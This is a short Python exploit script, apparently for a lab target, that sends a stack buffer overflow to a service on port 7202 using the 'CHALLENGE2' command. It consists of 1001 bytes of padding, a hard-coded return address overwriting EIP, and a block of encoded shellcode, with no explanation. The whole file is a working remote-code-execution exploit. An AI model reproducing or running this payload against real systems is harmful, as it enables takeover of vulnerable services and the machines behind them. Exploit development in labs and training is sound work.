#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import socket
from struct import pack

host = "192.168.15.4"
port = 7202

offset = b"A" * 1001

EIP = pack('<L', 0x72741FA8)
buf =  b""
buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x17\xea\x38\x19\x83\xee\xfc\xe2\xf4"
buf += b"\xeb\x02\xba\x19\x17\xea\x58\x90\xf2\xdb\xf8\x7d"
buf += b"\x9c\xba\x08\x92\x45\xe6\xb3\x4b\x03\x61\x4a\x31"
buf += b"\x18\x5d\x72\x3f\x26\x15\x94\x25\x76\x96\x3a\x35"
buf += b"\x37\x2b\xf7\x14\x16\x2d\xda\xeb\x45\xbd\xb3\x4b"
buf += b"\x07\x61\x72\x25\x9c\xa6\x29\x61\xf4\xa2\x39\xc8"
buf += b"\x46\x61\x61\x39\x16\x39\xb3\x50\x0f\x09\x02\x50"
buf += b"\x9c\xde\xb3\x18\xc1\xdb\xc7\xb5\xd6\x25\x35\x18"
buf += b"\xd0\xd2\xd8\x6c\xe1\xe9\x45\xe1\x2c\x97\x1c\x6c"
buf += b"\xf3\xb2\xb3\x41\x33\xeb\xeb\x7f\x9c\xe6\x73\x92"
buf += b"\x4f\xf6\x39\xca\x9c\xee\xb3\x18\xc7\x63\x7c\x3d"
buf += b"\x33\xb1\x63\x78\x4e\xb0\x69\xe6\xf7\xb5\x67\x43"
buf += b"\x9c\xf8\xd3\x94\x4a\x82\x0b\x2b\x17\xea\x50\x6e"
buf += b"\x64\xd8\x67\x4d\x7f\xa6\x4f\x3f\x10\x15\xed\xa1"
buf += b"\x87\xeb\x38\x19\x3e\x2e\x6c\x49\x7f\xc3\xb8\x72"
buf += b"\x17\x15\xed\x49\x47\xba\x68\x59\x47\xaa\x68\x71"
buf += b"\xfd\xe5\xe7\xf9\xe8\x3f\xaf\x73\x12\x82\xf8\xb1"
buf += b"\x18\xef\x50\x1b\x17\xfb\x64\x90\xf1\x80\x28\x4f"
buf += b"\x40\x82\xa1\xbc\x63\x8b\xc7\xcc\x92\x2a\x4c\x15"
buf += b"\xe8\xa4\x30\x6c\xfb\x82\xc8\xac\xb5\xbc\xc7\xcc"
buf += b"\x7f\x89\x55\x7d\x17\x63\xdb\x4e\x40\xbd\x09\xef"
buf += b"\x7d\xf8\x61\x4f\xf5\x17\x5e\xde\x53\xce\x04\x18"
buf += b"\x16\x67\x7c\x3d\x07\x2c\x38\x5d\x43\xba\x6e\x4f"
buf += b"\x41\xac\x6e\x57\x41\xbc\x6b\x4f\x7f\x93\xf4\x26"
buf += b"\x91\x15\xed\x90\xf7\xa4\x6e\x5f\xe8\xda\x50\x11"
buf += b"\x90\xf7\x58\xe6\xc2\x51\xc8\xac\xb5\xbc\x50\xbf"
buf += b"\x82\x57\xa5\xe6\xc2\xd6\x3e\x65\x1d\x6a\xc3\xf9"
buf += b"\x62\xef\x83\x5e\x04\x98\x57\x73\x17\xb9\xc7\xcc"

payload = offset + EIP + buf
buffer = b"CHALLENGE2 " + payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host, port))
print("Enviando Exploit ....")
exp.send(buffer)
exp.close()
